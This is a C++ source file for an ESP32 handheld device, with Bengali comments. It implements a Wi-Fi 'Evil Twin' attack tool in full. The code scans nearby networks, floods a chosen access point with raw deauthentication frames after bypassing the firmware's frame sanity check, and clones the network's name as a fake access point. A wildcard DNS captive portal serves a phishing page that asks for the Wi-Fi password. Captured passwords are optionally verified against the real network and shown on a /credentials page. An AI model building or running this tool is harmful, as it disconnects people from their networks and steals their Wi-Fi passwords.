#include "evil_twin.h"
#include "icon.h"
#include "setting.h"

namespace EvilTwin {

    // ==================== গ্লোবাল ভেরিয়েবল ====================
    MenuState currentState = MENU_MAIN;
    AttackMode currentAttack = NONE;
    VerifyMode verifyMode = VERIFY_OFF;

    int attackModeIndex = 0;
    int menuIndex = 0;

    // স্ক্যান ডেটা
    int networkCount = 0;
    wifi_ap_record_t *apList = nullptr;
    int selectedIndex = 0;
    int displayStart = 0;

    // টার্গেট
    uint8_t targetBSSID[6];
    String targetSSID;
    int targetChannel;
    String targetEncryption;

    // অ্যাটাক স্টেট
    bool attackRunning = false;
    bool deauthRunning = false;
    bool evilTwinRunning = false;

    // সার্ভার
    DNSServer dnsServer;
    WebServer webServer(80);

    // ক্রেডেনশিয়াল (RAM-এ)
    struct Credential {
        String ssid;
        String password;
        bool verified;
        String timestamp;
    };
    std::vector<Credential> capturedCredentials;
    String lastCapturedPassword = "";

    // ক্লায়েন্ট মনিটরিং
    struct ClientInfo {
        String mac;
        int rssi;
        String ip;
    };
    std::vector<ClientInfo> connectedClients;
    unsigned long lastClientUpdate = 0;

    // বাটন ডিবাউন্স
    unsigned long lastButtonPress = 0;
    const unsigned long debounceDelay = 200;

    // অ্যাটাক টাইমার
    unsigned long lastDeauthTime = 0;
    unsigned long lastStatusUpdate = 0;

    // ==================== ডিঅথ ফাংশন ====================
    extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
        return 0;
    }

    void sendDeauthFrame(const uint8_t *bssid, uint8_t channel) {
        WiFi.mode(WIFI_AP);
        delay(1);

        uint8_t deauth_frame[] = {
            0xC0, 0x00,
            0x00, 0x00,
            0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
            bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
            bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
            0x00, 0x00,
            0x07, 0x00
        };

        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
        esp_err_t res = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
        if (res != ESP_OK) {
            Serial.println("Deauth send failed");
        }
    }

    // ==================== পাসওয়ার্ড ভেরিফিকেশন ====================
    bool verifyPassword(String ssid, String password) {
        Serial.println("Verifying password for: " + ssid);
        wifi_mode_t currentMode = WiFi.getMode();
        WiFi.mode(WIFI_STA);
        WiFi.disconnect();
        delay(100);
        WiFi.begin(ssid.c_str(), password.c_str());
        unsigned long startTime = millis();
        while (WiFi.status() != WL_CONNECTED && millis() - startTime < 5000) {
            delay(100);
        }
        bool connected = (WiFi.status() == WL_CONNECTED);
        if (connected) {
            Serial.println("Password verified! Connected to: " + ssid);
            WiFi.disconnect();
        } else {
            Serial.println("Password verification failed for: " + ssid);
        }
        WiFi.mode(currentMode);
        delay(100);
        return connected;
    }

    // ==================== ক্রেডেনশিয়াল ক্যাপচার (RAM-এ) ====================
    void captureCredential(String ssid, String password, bool verified) {
        Credential cred;
        cred.ssid = ssid;
        cred.password = password;
        cred.verified = verified;

        struct tm timeinfo;
        if (getNtpTime(&timeinfo)) {
            char buf[20];
            strftime(buf, sizeof(buf), "%H:%M:%S", &timeinfo);
            cred.timestamp = String(buf);
        } else {
            cred.timestamp = String(millis() / 1000);
        }

        capturedCredentials.push_back(cred);
        lastCapturedPassword = password;

        Serial.println("Credential captured: " + ssid + " -> " + password);
        setNeoPixelColour("green");
        delay(200);
        setNeoPixelColour("0");

        // যদি ক্রেডেনশিয়াল স্ক্রিনে থাকি, তাহলে আপডেট করি
        if (currentState == MENU_CREDENTIALS) {
            drawCredentials();
        }
    }

    // ==================== ক্লায়েন্ট মনিটরিং ====================
    void updateClientList() {
        connectedClients.clear();
        wifi_sta_list_t sta_list;
        esp_wifi_ap_get_sta_list(&sta_list);
        for (int i = 0; i < sta_list.num; i++) {
            ClientInfo client;
            char macStr[18];
            sprintf(macStr, "%02X:%02X:%02X:%02X:%02X:%02X",
                    sta_list.sta[i].mac[0], sta_list.sta[i].mac[1],
                    sta_list.sta[i].mac[2], sta_list.sta[i].mac[3],
                    sta_list.sta[i].mac[4], sta_list.sta[i].mac[5]);
            client.mac = String(macStr);
            client.rssi = sta_list.sta[i].rssi;
            client.ip = "N/A";
            connectedClients.push_back(client);
        }
        lastClientUpdate = millis();
    }

    int getConnectedClientCount() {
        return WiFi.softAPgetStationNum();
    }

    // ==================== স্ক্যান অ্যানিমেশন ====================
    void drawScanAnimation() {
        for (int cycle = 0; cycle < 2; cycle++) {
            for (int i = 0; i < 3; i++) {
                u8g2.clearBuffer();
                u8g2.setFont(u8g2_font_6x10_tr);
                u8g2.drawStr(0, 10, "Scanning WiFi");
                String dots = "";
                for (int j = 0; j <= i; j++) {
                    dots += ".";
                }
                u8g2.drawStr(80, 10, dots.c_str());
                setNeoPixelColour("white");
                u8g2.sendBuffer();
                delay(300);
            }
        }
        setNeoPixelColour("0");
    }

    // ==================== Wi-Fi স্ক্যান ====================
    bool scanNetworks() {
        Serial.println("Scanning networks...");
        drawScanAnimation(); // অ্যানিমেশন দেখান

        WiFi.mode(WIFI_STA);
        WiFi.disconnect();
        delay(100);

        networkCount = WiFi.scanNetworks();
        if (networkCount == 0) {
            Serial.println("No networks found");
            setNeoPixelColour("0");
            return false;
        }

        if (apList) free(apList);
        apList = (wifi_ap_record_t*)malloc(networkCount * sizeof(wifi_ap_record_t));
        if (!apList) {
            Serial.println("Memory allocation failed");
            setNeoPixelColour("0");
            return false;
        }

        for (int i = 0; i < networkCount; i++) {
            wifi_ap_record_t ap;
            memcpy(ap.bssid, WiFi.BSSID(i), 6);
            strncpy((char*)ap.ssid, WiFi.SSID(i).c_str(), sizeof(ap.ssid));
            ap.rssi = WiFi.RSSI(i);
            ap.primary = WiFi.channel(i);
            ap.authmode = WiFi.encryptionType(i);
            apList[i] = ap;
        }

        qsort(apList, networkCount, sizeof(wifi_ap_record_t), [](const void *a, const void *b) {
            return ((wifi_ap_record_t*)b)->rssi - ((wifi_ap_record_t*)a)->rssi;
        });

        Serial.println("Found " + String(networkCount) + " networks");
        setNeoPixelColour("0");
        return true;
    }

    // ==================== ফেক AP, DNS, ওয়েব সার্ভার ====================
    String getPhishingPage() {
        String html = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WiFi Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #f5f5f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 12px;
            box-shadow: 0 8px 30px rgba(0,0,0,0.12);
            padding: 40px 30px;
            max-width: 400px;
            width: 100%;
            text-align: center;
        }
        .logo { font-size: 48px; margin-bottom: 10px; }
        h1 { font-size: 22px; color: #333; margin-bottom: 8px; font-weight: 600; }
        .subtitle { color: #666; font-size: 14px; margin-bottom: 25px; }
        .input-group { margin-bottom: 16px; text-align: left; }
        .input-group label { display: block; font-size: 13px; font-weight: 500; color: #555; margin-bottom: 5px; }
        .input-group input {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 16px;
            transition: border-color 0.3s;
        }
        .input-group input:focus { border-color: #4A90D9; outline: none; }
        .btn {
            width: 100%;
            padding: 14px;
            background: #4A90D9;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.3s;
        }
        .btn:hover { background: #357ABD; }
        .btn:active { transform: scale(0.98); }
        .error { color: #e74c3c; font-size: 13px; margin-top: 10px; display: none; }
        .footer { margin-top: 20px; font-size: 12px; color: #999; }
        .loader {
            display: none;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #4A90D9;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 10px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">📶</div>
        <h1>WiFi Network</h1>
        <p class="subtitle">Enter password to connect to <strong>)rawliteral" + targetSSID + R"rawliteral(</strong></p>
        <form id="loginForm" method="POST" action="/login">
            <div class="input-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Enter WiFi password" required>
            </div>
            <div id="errorMsg" class="error">Incorrect password. Please try again.</div>
            <button type="submit" class="btn">Connect</button>
        </form>
        <div id="loader" class="loader"></div>
        <div id="statusMsg" style="margin-top:10px;font-size:14px;color:#666;"></div>
        <div class="footer">This network requires authentication</div>
    </div>
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            var pass = document.getElementById('password').value;
            if (pass.length < 4) {
                document.getElementById('errorMsg').style.display = 'block';
                document.getElementById('errorMsg').textContent = 'Password must be at least 4 characters';
                return;
            }
            document.getElementById('errorMsg').style.display = 'none';
            document.getElementById('loader').style.display = 'block';
            document.querySelector('.btn').disabled = true;
            document.querySelector('.btn').textContent = 'Connecting...';

            var formData = new FormData();
            formData.append('password', pass);

            fetch('/login', {
                method: 'POST',
                body: formData
            })
            .then(response => response.text())
            .then(data => {
                document.getElementById('loader').style.display = 'none';
                document.querySelector('.btn').disabled = false;
                document.querySelector('.btn').textContent = 'Connect';
                if (data === 'success') {
                    document.getElementById('statusMsg').innerHTML = '✅ Connected successfully!';
                    document.getElementById('statusMsg').style.color = '#27ae60';
                } else if (data === 'verify') {
                    document.getElementById('statusMsg').innerHTML = '⏳ Verifying password...';
                    document.getElementById('statusMsg').style.color = '#f39c12';
                } else {
                    document.getElementById('errorMsg').style.display = 'block';
                    document.getElementById('errorMsg').textContent = 'Incorrect password. Please try again.';
                }
            })
            .catch(() => {
                document.getElementById('loader').style.display = 'none';
                document.querySelector('.btn').disabled = false;
                document.querySelector('.btn').textContent = 'Connect';
                document.getElementById('errorMsg').style.display = 'block';
                document.getElementById('errorMsg').textContent = 'Network error. Please try again.';
            });
        });
    </script>
</body>
</html>
)rawliteral";
        return html;
    }

    void startCaptivePortal() {
        if (!SPIFFS.begin(true)) {
            Serial.println("SPIFFS mount failed");
            return;
        }

        WiFi.mode(WIFI_AP);
        esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
        WiFi.softAP(targetSSID.c_str());
        targetChannel = WiFi.channel();

        dnsServer.start(53, "*", WiFi.softAPIP());

        webServer.on("/", HTTP_GET, []() {
            webServer.send(200, "text/html", getPhishingPage());
        });

        webServer.on("/login", HTTP_POST, []() {
            if (webServer.hasArg("password")) {
                String password = webServer.arg("password");
                Serial.println("Password received: " + password);

                bool verified = false;
                String response = "";

                if (verifyMode == VERIFY_ON) {
                    verified = verifyPassword(targetSSID, password);
                    if (verified) {
                        response = "success";
                        setNeoPixelColour("green");
                    } else {
                        response = "verify_failed";
                        setNeoPixelColour("red");
                        delay(500);
                        setNeoPixelColour("0");
                    }
                } else {
                    verified = false;
                    response = "captured";
                    setNeoPixelColour("yellow");
                }

                captureCredential(targetSSID, password, verified);

                if (verified) {
                    webServer.send(200, "text/plain", "success");
                } else {
                    webServer.send(200, "text/plain", "verify");
                }

                drawAttackStatus();
            } else {
                webServer.send(400, "text/plain", "Bad Request");
            }
        });

        webServer.on("/credentials", HTTP_GET, []() {
            String html = "<h2>Captured Credentials</h2><ul>";
            for (auto &cred : capturedCredentials) {
                html += "<li>SSID: " + cred.ssid + " | PASS: " + cred.password + " | VERIFIED: " + (cred.verified ? "YES" : "NO") + "</li>";
            }
            html += "</ul><a href='/'>Back</a>";
            webServer.send(200, "text/html", html);
        });

        webServer.onNotFound([]() {
            webServer.sendHeader("Location", "http://192.168.4.1/", true);
            webServer.send(302, "text/plain", "");
        });

        webServer.begin();
        Serial.println("Captive portal started at " + WiFi.softAPIP().toString());
        evilTwinRunning = true;
    }

    void stopCaptivePortal() {
        dnsServer.stop();
        webServer.stop();
        WiFi.softAPdisconnect(true);
        SPIFFS.end();
        evilTwinRunning = false;
        Serial.println("Captive portal stopped");
    }

    // ==================== অ্যাটাক কন্ট্রোল ====================
    void startDeauth() {
        if (deauthRunning) return;
        deauthRunning = true;
        WiFi.mode(WIFI_AP);
        delay(10);
        Serial.println("Deauth attack started on channel " + String(targetChannel));
    }

    void stopDeauth() {
        deauthRunning = false;
        WiFi.mode(WIFI_STA);
        delay(10);
        Serial.println("Deauth attack stopped");
    }

    void startEvilTwin() {
        if (evilTwinRunning) return;
        startCaptivePortal();
    }

    void stopEvilTwin() {
        if (evilTwinRunning) stopCaptivePortal();
    }

    void startCombinedAttack() {
        startDeauth();
        startEvilTwin();
    }

    void stopCombinedAttack() {
        stopDeauth();
        stopEvilTwin();
    }

    void startAttack() {
        if (attackRunning) return;
        attackRunning = true;

        switch(currentAttack) {
            case DEAUTH_ONLY:
                startDeauth();
                break;
            case EVIL_TWIN_ONLY:
                startEvilTwin();
                break;
            case EVIL_TWIN_DEAUTH:
                startCombinedAttack();
                break;
            default:
                break;
        }

        drawAttackStatus();
        setNeoPixelColour("orange");
    }

    void stopAttack() {
        if (!attackRunning) return;
        attackRunning = false;

        stopCombinedAttack();
        stopDeauth();
        stopEvilTwin();

        currentAttack = NONE;
        WiFi.mode(WIFI_STA);
        setNeoPixelColour("0");
        drawMainMenu();
    }

    // ==================== OLED ডিসপ্লে ফাংশন ====================
    void drawMainMenu() {
        u8g2.clearBuffer();
        u8g2.setFont(u8g2_font_6x10_tr);
        u8g2.drawXBMP(0, 0, 16, 16, bitmap_icon_evil_twin);
        u8g2.drawStr(20, 12, "Evil Twin");

        const char* items[] = {"Scan Networks", "Attack Mode", "Show Credentials", "Monitor Clients"};
        const int itemCount = 4;
        int yStart = 28;

        for (int i = 0; i < itemCount; i++) {
            int y = yStart + i * 10;
            if (i == menuIndex) {
                u8g2.drawStr(0, y, ">");
                u8g2.drawStr(8, y, items[i]);
            } else {
                u8g2.drawStr(8, y, items[i]);
            }
        }
        u8g2.sendBuffer();
    }

    void drawScanList() {
        u8g2.clearBuffer();
        u8g2.setFont(u8g2_font_6x10_tr);
        u8g2.drawStr(0, 10, "Select Target:");

        int count = networkCount;
        for (int i = 0; i < 5; i++) {
            int idx = displayStart + i;
            if (idx >= count) break;

            String name = String((char*)apList[idx].ssid);
            if (name.length() == 0) name = "(Hidden)";
            if (name.length() > 10) name = name.substring(0, 10);

            String rssi = String(apList[idx].rssi);
            String ch = "Ch" + String(apList[idx].primary);

            if (idx == selectedIndex) {
                u8g2.drawStr(0, 23 + i*10, ">");
                u8g2.drawStr(8, 23 + i*10, (name + " " + rssi + "dBm " + ch).c_str());
            } else {
                u8g2.drawStr(8, 23 + i*10, (name + " " + rssi + "dBm").c_str());
            }
        }

        u8g2.setFont(u8g2_font_5x8_tr);
        u8g2.drawStr(0, 63, "UP/DOWN=Scroll  RIGHT=Select");
        u8g2.sendBuffer();
    }

    void drawAttackModeMenu() {
        u8g2.clearBuffer();
        u8g2.setFont(u8g2_font_6x10_tr);
        u8g2.drawStr(0, 10, "Attack Mode:");

        const char* modes[] = {"Deauth Only", "EvilTwin Only", "EvilTwin + Deauth"};
        const int modeCount = 3;

        for (int i = 0; i < modeCount; i++) {
            int y = 26 + i * 14;
            if (i == attackModeIndex) {
                u8g2.drawStr(0, y, ">");
                u8g2.drawStr(8, y, modes[i]);
            } else {
                u8g2.drawStr(8, y, modes[i]);
            }
        }

        String verifyStatus = verifyMode == VERIFY_ON ? "ON" : "OFF";
        u8g2.setFont(u8g2_font_5x8_tr);
        u8g2.drawStr(0, 70, ("Verify: " + verifyStatus + " (LEFT toggle)").c_str());

        u8g2.sendBuffer();
    }

    void drawAttackStatus() {
        u8g2.clearBuffer();
        u8g2.setFont(u8g2_font_6x10_tr);

        u8g2.drawStr(0, 10, "Attack Status");

        String mode;
        switch(currentAttack) {
            case DEAUTH_ONLY: mode = "Deauth"; break;
            case EVIL_TWIN_ONLY: mode = "Evil Twin"; break;
            case EVIL_TWIN_DEAUTH: mode = "Evil Twin+Deauth"; break;
            default: mode = "None"; break;
        }
        u8g2.drawStr(0, 25, ("Mode: " + mode).c_str());
        u8g2.drawStr(0, 38, ("Target: " + targetSSID).c_str());
        u8g2.drawStr(0, 51, ("Clients: " + String(getConnectedClientCount())).c_str());

        if (lastCapturedPassword != "") {
            u8g2.drawStr(0, 64, ("Last Pass: " + lastCapturedPassword).c_str());
        }

        u8g2.setFont(u8g2_font_5x8_tr);
        u8g2.drawStr(0, 75, "LEFT=Stop  SELECT=Monitor");
        u8g2.sendBuffer();
    }

    void drawCredentials() {
        u8g2.clearBuffer();
        u8g2.setFont(u8g2_font_6x10_tr);
        u8g2.drawStr(0, 10, "Captured (RAM):");

        int y = 25;
        int lineCount = 0;
        if (capturedCredentials.empty()) {
            u8g2.drawStr(0, y, "No data");
        } else {
            for (auto &cred : capturedCredentials) {
                if (y > 70 || lineCount >= 6) break;
                String display = cred.ssid + " | " + cred.password;
                if (display.length() > 16) display = display.substring(0, 16) + "...";
                u8g2.drawStr(0, y, display.c_str());
                y += 10;
                lineCount++;
            }
        }

        u8g2.setFont(u8g2_font_5x8_tr);
        u8g2.drawStr(0, 75, "LEFT=Back");
        u8g2.sendBuffer();
    }

    void drawMonitorScreen() {
        u8g2.clearBuffer();
        u8g2.setFont(u8g2_font_6x10_tr);
        u8g2.drawStr(0, 10, "Connected Clients:");

        int count = getConnectedClientCount();
        u8g2.drawStr(0, 25, ("Total: " + String(count)).c_str());

        updateClientList();
        int y = 38;
        for (auto &client : connectedClients) {
            if (y > 70) break;
            String info = client.mac.substring(0, 17);
            u8g2.setFont(u8g2_font_5x8_tr);
            u8g2.drawStr(0, y, info.c_str());
            u8g2.drawStr(70, y, (String(client.rssi) + "dBm").c_str());
            y += 10;
        }

        u8g2.setFont(u8g2_font_5x8_tr);
        u8g2.drawStr(0, 75, "LEFT=Back  SELECT=Refresh");
        u8g2.sendBuffer();
    }

    // ==================== বাটন হ্যান্ডলিং ====================
    void handleButtons() {
        unsigned long now = millis();
        if (now - lastButtonPress < debounceDelay) return;

        bool up = digitalRead(BUTTON_UP_PIN) == LOW;
        bool down = digitalRead(BUTTON_DOWN_PIN) == LOW;
        bool right = digitalRead(BTN_PIN_RIGHT) == LOW;
        bool left = digitalRead(BTN_PIN_LEFT) == LOW;
        bool select = digitalRead(BUTTON_SELECT_PIN) == LOW;

        if (up || down || right || left || select) {
            lastButtonPress = now;
        } else {
            return;
        }

        // অ্যাটাক চললে
        if (attackRunning) {
            if (left) {
                stopAttack();
                return;
            }
            if (select) {
                currentState = MENU_MONITOR;
                drawMonitorScreen();
                return;
            }
            drawAttackStatus();
            return;
        }

        switch(currentState) {
            case MENU_MAIN:
                if (up) {
                    menuIndex = (menuIndex - 1 + 4) % 4;
                    drawMainMenu();
                } else if (down) {
                    menuIndex = (menuIndex + 1) % 4;
                    drawMainMenu();
                } else if (right || select) {
                    if (menuIndex == 0) {
                        currentState = MENU_SCAN;
                        if (scanNetworks()) {
                            drawScanList();
                        } else {
                            currentState = MENU_MAIN;
                            drawMainMenu();
                        }
                    } else if (menuIndex == 1) {
                        currentState = MENU_ATTACK_MODE;
                        drawAttackModeMenu();
                    } else if (menuIndex == 2) {
                        currentState = MENU_CREDENTIALS;
                        drawCredentials();
                    } else if (menuIndex == 3) {
                        currentState = MENU_MONITOR;
                        drawMonitorScreen();
                    }
                }
                break;

            case MENU_SCAN:
                if (up) {
                    if (selectedIndex > 0) {
                        selectedIndex--;
                        if (selectedIndex < displayStart) displayStart--;
                    }
                    drawScanList();
                } else if (down) {
                    if (selectedIndex < networkCount - 1) {
                        selectedIndex++;
                        if (selectedIndex >= displayStart + 5) displayStart++;
                    }
                    drawScanList();
                } else if (right || select) {
                    if (networkCount > 0 && selectedIndex < networkCount) {
                        memcpy(targetBSSID, apList[selectedIndex].bssid, 6);
                        targetSSID = String((char*)apList[selectedIndex].ssid);
                        if (targetSSID.length() == 0) targetSSID = "(Hidden)";
                        targetChannel = apList[selectedIndex].primary;
                        currentState = MENU_MAIN;
                        drawMainMenu();
                        setNeoPixelColour("blue");
                        delay(200);
                        setNeoPixelColour("0");
                    }
                } else if (left) {
                    currentState = MENU_MAIN;
                    drawMainMenu();
                }
                break;

            case MENU_ATTACK_MODE:
                if (up) {
                    attackModeIndex = (attackModeIndex - 1 + 3) % 3;
                    drawAttackModeMenu();
                } else if (down) {
                    attackModeIndex = (attackModeIndex + 1) % 3;
                    drawAttackModeMenu();
                } else if (right || select) {
                    if (targetSSID.length() == 0 || targetSSID == "(Hidden)") {
                        currentState = MENU_SCAN;
                        if (scanNetworks()) {
                            drawScanList();
                        } else {
                            currentState = MENU_MAIN;
                            drawMainMenu();
                        }
                    } else {
                        switch(attackModeIndex) {
                            case 0: currentAttack = DEAUTH_ONLY; break;
                            case 1: currentAttack = EVIL_TWIN_ONLY; break;
                            case 2: currentAttack = EVIL_TWIN_DEAUTH; break;
                        }
                        startAttack();
                    }
                } else if (left) {
                    // LEFT বাটন এখন ব্যাক করবে (মেইন মেনুতে ফিরে যাবে)
                    currentState = MENU_MAIN;
                    drawMainMenu();
                }
                break;

            case MENU_CREDENTIALS:
                if (left || right || select) {
                    currentState = MENU_MAIN;
                    drawMainMenu();
                }
                break;

            case MENU_MONITOR:
                if (left) {
                    currentState = MENU_MAIN;
                    drawMainMenu();
                } else if (select || right) {
                    drawMonitorScreen(); // রিফ্রেশ
                }
                break;
        }
    }

    // ==================== লুপ ====================
    void evilTwinLoop() {
        handleButtons();

        if (attackRunning) {
            if (evilTwinRunning) {
                dnsServer.processNextRequest();
                webServer.handleClient();
            }

            if (deauthRunning) {
                unsigned long now = millis();
                if (now - lastDeauthTime > 50) {
                    sendDeauthFrame(targetBSSID, targetChannel);
                    lastDeauthTime = now;
                }
            }

            if (millis() - lastClientUpdate > 2000) {
                updateClientList();
            }

            if (millis() - lastStatusUpdate > 3000) {
                drawAttackStatus();
                lastStatusUpdate = millis();
            }
        }
    }

    // ==================== সেটআপ ====================
    void evilTwinSetup() {
        Serial.begin(115200);

        pinMode(BUTTON_UP_PIN, INPUT_PULLUP);
        pinMode(BUTTON_DOWN_PIN, INPUT_PULLUP);
        pinMode(BTN_PIN_LEFT, INPUT_PULLUP);
        pinMode(BTN_PIN_RIGHT, INPUT_PULLUP);
        pinMode(BUTTON_SELECT_PIN, INPUT_PULLUP);

        WiFi.mode(WIFI_STA);
        WiFi.disconnect();

        currentState = MENU_MAIN;
        currentAttack = NONE;
        attackRunning = false;
        deauthRunning = false;
        evilTwinRunning = false;
        lastCapturedPassword = "";
        capturedCredentials.clear();
        connectedClients.clear();

        u8g2.clearBuffer();
        u8g2.drawXBMP(0, 0, 16, 16, bitmap_icon_evil_twin);
        u8g2.setFont(u8g2_font_6x10_tr);
        u8g2.drawStr(20, 12, "Evil Twin Ready");
        u8g2.sendBuffer();
        delay(1000);

        drawMainMenu();
        setNeoPixelColour("0");
        Serial.println("Evil Twin setup complete");
    }
}